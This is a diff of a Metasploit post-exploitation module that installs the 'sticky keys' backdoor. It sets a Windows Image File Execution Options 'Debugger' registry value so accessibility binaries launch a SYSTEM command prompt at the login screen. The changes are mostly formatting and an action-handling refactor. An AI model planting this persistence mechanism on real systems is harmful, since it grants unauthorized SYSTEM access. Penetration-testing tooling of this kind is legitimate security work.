@@ -14,10 +14,10 @@ class Metasploit4 < Msf::Post
   DEBUG_REG_PATH = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
   DEBUG_REG_VALUE = 'Debugger'
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'         => 'Sticky Keys Persistance Module',
-      'Description'  => %q{
+      'Name'          => 'Sticky Keys Persistance Module',
+      'Description'   => %q{
         This module makes it possible to apply the 'sticky keys' hack to a session with appropriate
         rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP
         login screen or via a UAC confirmation dialog. The module modifies the Debug registry setting
@@ -36,13 +36,17 @@ class Metasploit4 < Msf::Post
         to the target prior to running the module. By default, a SYSTEM command prompt is installed
         using the registry method if this module is run without modifying any parameters.
       },
-      'Author'       => ['OJ Reeves'],
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter', 'cmd']
+      'Author'        => ['OJ Reeves'],
+      'Platform'      => ['win'],
+      'SessionTypes'  => ['meterpreter', 'cmd'],
+      'Actions'       => [
+          [ 'ADD',    { 'Description' => 'Add the backdoor to the target.' } ],
+          [ 'REMOVE', { 'Description' => 'Remove the backdoor from the target' } ]
+      ],
+      'DefaultAction' => 'ADD'
     ))
 
     register_options([
-      OptEnum.new('ACTION', [true, 'Specifies whether to add or remove the exploit.', 'ADD', ['ADD', 'REMOVE']]),
       OptEnum.new('TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP']]),
       OptString.new('EXE', [true, 'Executable to execute when the exploit is triggered', '%SYSTEMROOT%\system32\cmd.exe'])
     ], self.class)
@@ -96,11 +100,11 @@ class Metasploit4 < Msf::Post
       fail_with(Failure::NoAccess, 'The current session does not have administrative rights.')
     end
 
-    print_good("Session has administrator rights, proceeding.")
+    print_good("Session has administrative rights, proceeding.")
 
     target_key = get_target_exe_reg_key
 
-    if datastore['ACTION'] == 'ADD'
+    if action.name == 'ADD'
       command = expand_path(datastore['EXE'])
 
       registry_createkey(target_key)
